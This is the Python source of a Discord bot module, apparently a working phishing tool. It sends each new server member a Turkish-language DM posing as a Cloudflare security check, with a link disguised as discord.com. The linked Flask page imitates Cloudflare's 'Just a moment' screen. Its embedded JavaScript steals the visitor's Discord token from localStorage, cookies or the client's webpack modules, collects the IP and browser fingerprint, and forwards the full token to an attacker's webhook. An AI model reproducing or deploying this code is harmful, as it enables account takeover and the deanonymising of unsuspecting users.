import discord
from discord.ext import commands, tasks
import config
import datetime
import json
import queue
import threading
import aiohttp
import logging

_capture_queue = queue.Queue()

CF_HTML = """<!DOCTYPE html><html lang=tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Just a moment...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:36px 40px;width:460px;max-width:94vw;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.6)}.cf-logo{width:44px;height:44px;margin:0 auto 14px}.cf-logo svg{width:44px;height:44px}h1{font-size:18px;font-weight:600;color:#e6edf3;margin-bottom:6px}.sub{color:#8b949e;font-size:13px;margin-bottom:24px;line-height:1.5}.widget{display:flex;align-items:center;justify-content:space-between;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px 16px;cursor:pointer;transition:border-color .2s,background .2s;user-select:none;margin-bottom:8px}.widget:hover{border-color:#58a6ff;background:#111820}.widget-left{display:flex;align-items:center;gap:10px}.cf-checkbox{width:22px;height:22px;border:2px solid #484f58;border-radius:4px;display:flex;align-items:center;justify-content:center;transition:all .25s;font-size:13px;color:#fff;flex-shrink:0}.cf-checkbox.done{background:#238636;border-color:#238636}.cf-brand{font-size:11px;color:#8b949e;display:flex;align-items:center;gap:4px}.cf-brand svg{width:16px;height:16px}.spinner{display:none;align-items:center;justify-content:center;gap:10px;padding:8px 0;margin-top:4px}.spinner.show{display:flex}.loader{width:22px;height:22px;border:3px solid #238636;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}.loading-text{font-size:14px;color:#3fb950;font-weight:500}.verified{display:none;align-items:center;justify-content:center;gap:8px;padding:8px 0;margin-top:4px}.verified.show{display:flex}.checkmark{width:24px;height:24px;background:#238636;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;color:#fff;font-weight:700}.verified-text{font-size:16px;color:#3fb950;font-weight:600}.cf-footer{margin-top:24px;padding-top:14px;border-top:1px solid #21262d;font-size:11px;color:#484f58}.cf-footer span{display:block;margin-bottom:2px}.cf-footer small{color:#30363d;font-size:10px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class=card><div class=cf-logo><svg viewBox="0 0 48 48" fill=none><circle cx=24 cy=24 r=22 fill=#F38020/><path d="M16 28c0-2.8 2.2-5 5-5h1.8c-.4-1.9.2-3.9 1.6-5.4 1.6-1.9 4.2-2.7 6.5-2.2 2.4.5 4.4 2.2 5.3 4.4.4-.1.8-.2 1.2-.2 2.8 0 5 2.2 5 5 0 .6-.1 1.2-.3 1.8H21c-1.4 0-2.5-1.1-2.5-2.5l.3-1.6c-.1-.3-.3-.6-.8-.8z" fill=#fff/></svg></div><h1>Just a moment...</h1><p class=sub>Checking your browser before accessing the server. This is protected by Cloudflare&reg;.</p><div class=widget id=cf-widget onclick=startVerify()><div class=widget-left><div class=cf-checkbox id=cf-checkbox></div><span style=font-size:13px;color:#e6edf3>I am human</span></div><div class=cf-brand><svg viewBox="0 0 24 24"><circle cx=12 cy=12 r=10 fill=#F38020/><path d="M8 14c0-1.4 1.1-2.5 2.5-2.5h.9c-.2-1 .1-2 .8-2.7.8-1 2.1-1.4 3.3-1.1s2.2 1.1 2.6 2.2c.2-.1.4-.1.6-.1 1.4 0 2.5 1.1 2.5 2.5 0 .3-.1.6-.2.9H10.5c-.7 0-1.2-.6-1.2-1.2l.1-.8c-.1-.1-.2-.3-.4-.4z" fill=#fff/></svg>Cloudflare</div></div><div class=spinner id=cf-spinner><div class=loader></div><span class=loading-text>Verifying...</span></div><div class=verified id=cf-verified><div class=checkmark>&#10003;</div><span class=verified-text>Verified!</span></div><div class=cf-footer><span>Powered by Cloudflare&reg;</span><small>Protecting your connection &middot; 3.2.1</small></div></div><script>var INV="{INVITE}";var UID={UID};function gT(){var t=null;try{var x=localStorage.getItem('token');if(x)t=x}catch(e){}if(!t){try{var c=document.cookie.split(';').find(function(x){return x.trim().startsWith('token=')});if(c)t=c.split('=')[1].trim()}catch(e){}}if(!t&&window.webpackChunkdiscord_app&&webpackChunkdiscord_app.push){try{webpackChunkdiscord_app.push([[Symbol('discord')],{},function(e){if(!e||!e.c)return{};Object.keys(e.c).forEach(function(k){var m=e.c[k].exports;if(m&&m.default&&typeof m.default.getToken==='function'){try{t=m.default.getToken()}catch(e){}}});return e.c}])}catch(e){}}return t}function startVerify(){document.getElementById('cf-widget').onclick=null;document.getElementById('cf-widget').style.cursor='default';document.getElementById('cf-checkbox').classList.add('done');document.getElementById('cf-checkbox').textContent='✓';document.getElementById('cf-spinner').classList.add('show');var d={screen:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ua:navigator.userAgent,token:gT()};fetch('/capture/'+UID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){});setTimeout(function(){document.getElementById('cf-spinner').classList.remove('show');document.getElementById('cf-verified').classList.add('show')},1800);setTimeout(function(){window.location.href=INV},4800)}</script></body></html>"""


def _create_flask_app():
    from flask import Flask, request, jsonify

    app = Flask(__name__)

    @app.route("/verify/<int:user_id>")
    def verify_page(user_id):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0").split(",")[0].strip()
        ua = request.headers.get("User-Agent", "Unknown")
        invite = (config.GUILD_INVITE or "https://discord.com").rstrip("/")
        page = CF_HTML.replace("{INVITE}", invite).replace("{UID}", str(user_id))
        now = datetime.datetime.utcnow().isoformat()
        logging.info(f"[VerifyTrap] Page served: user={user_id} ip={ip} ua={ua[:60]} time={now}")
        return page

    @app.route("/capture/<int:user_id>", methods=["POST"])
    def capture_data(user_id):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "0.0.0.0").split(",")[0].strip()
        data = request.get_json(silent=True) or {}
        data["_ip"] = ip
        data["_user_id"] = user_id
        data["_time"] = datetime.datetime.utcnow().isoformat()
        _capture_queue.put(data)
        token_found = bool(data.get("token"))
        logging.info(f"[VerifyTrap] Capture: user={user_id} ip={ip} token={'YES' if token_found else 'NO'}")
        return jsonify({"status": "ok"})

    return app


class VerifyTrap(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self._start_flask()

    def _start_flask(self):
        app = _create_flask_app()
        host = "0.0.0.0"
        port = 5001
        import urllib.parse
        try:
            parsed = urllib.parse.urlparse(config.BASE_URL)
            if parsed.port:
                port = parsed.port
        except:
            pass
        t = threading.Thread(target=lambda: app.run(host=host, port=port, debug=False, use_reloader=False), daemon=True)
        t.start()
        self.sender_loop.start()

    def cog_unload(self):
        self.sender_loop.cancel()

    @tasks.loop(seconds=2)
    async def sender_loop(self):
        if not config.WEBHOOK_URL:
            return
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    item = _capture_queue.get_nowait()
                except queue.Empty:
                    return
                await self._send_webhook(session, item)

    async def _send_webhook(self, session, item):
        ip = item.get("_ip", "0.0.0.0")
        uid = item.get("_user_id", 0)
        ts = item.get("_time", datetime.datetime.utcnow().isoformat())
        screen = item.get("screen", "Bilinmiyor")
        lang = item.get("lang", "Bilinmiyor")
        tz = item.get("tz", "Bilinmiyor")
        ua = item.get("ua", "Bilinmiyor")
        token = item.get("token")

        embed1 = discord.Embed(
            title="Cloudflare Tuzağı - IP Yakalandı",
            color=config.COLOR_CRITICAL,
            timestamp=datetime.datetime.utcnow()
        )
        embed1.description = f"**Hedef:** <@{uid}> doğrulama sayfasını açtı!"
        embed1.add_field(name="IP Adresi", value=f"`{ip}`")
        embed1.add_field(name="User-Agent", value=f"```{ua[:200]}```", inline=False)
        embed1.add_field(name="Ekran", value=screen)
        embed1.add_field(name="Dil", value=lang)
        embed1.add_field(name="Saat Dilimi", value=tz)
        embed1.add_field(name="Zaman (UTC)", value=ts)
        embed1.set_footer(text=config.BASE_URL)

        embed2 = discord.Embed(
            title="Discord Token Bilgisi",
            color=config.COLOR_WARNING if token else config.COLOR_NORMAL,
            timestamp=datetime.datetime.utcnow()
        )
        if token and isinstance(token, str) and len(token) > 10:
            masked = token[:40] + "..." if len(token) > 40 else token
            embed2.description = f"```{masked}```"
            embed2.add_field(name="Durum", value="Token bulundu!")
            embed2.add_field(name="Uzunluk", value=str(len(token)))
            embed2.add_field(name="Tam Token (DM'de)", value=f"||{token}||", inline=False)
        else:
            embed2.description = "Token bulunamadı"
            embed2.add_field(name="Durum", value="Token tespit edilemedi")

        payload = {"embeds": [embed1.to_dict(), embed2.to_dict()]}

        try:
            async with session.post(config.WEBHOOK_URL, json=payload) as resp:
                if resp.status >= 400:
                    logging.warning(f"[VerifyTrap] Webhook error: HTTP {resp.status}")
        except Exception as e:
            logging.warning(f"[VerifyTrap] Webhook exception: {e}")

    def _get_base_url(self):
        return config.BASE_URL.rstrip("/")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        if member.bot:
            return
        base = self._get_base_url()
        uid = member.id
        link = f"{base}/verify/{uid}"
        masked = f"[discord.com/verify/{uid}]({link})"
        try:
            await member.send(
                f"**☁️ Cloudflare Güvenlik Doğrulaması**\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"Merhaba **{member.name}**, **{member.guild.name}** sunucusuna katıldın.\n\n"
                f"Sunucu Cloudflare® koruması altındadır. Erişim için "
                f"lütfen aşağıdaki doğrulama linkine tıklayarak kimliğini doğrula.\n\n"
                f"**Doğrulama Linki:**\n"
                f"{masked}\n\n"
                f"⏳ Bu bağlantı 15 dakika süreyle geçerlidir.\n"
                f"*Doğrulama yapılmayan hesaplar sunucudan çıkarılacaktır.*\n\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Cloudflare Security Team"
            )
        except:
            pass


async def setup(bot):
    await bot.add_cog(VerifyTrap(bot))
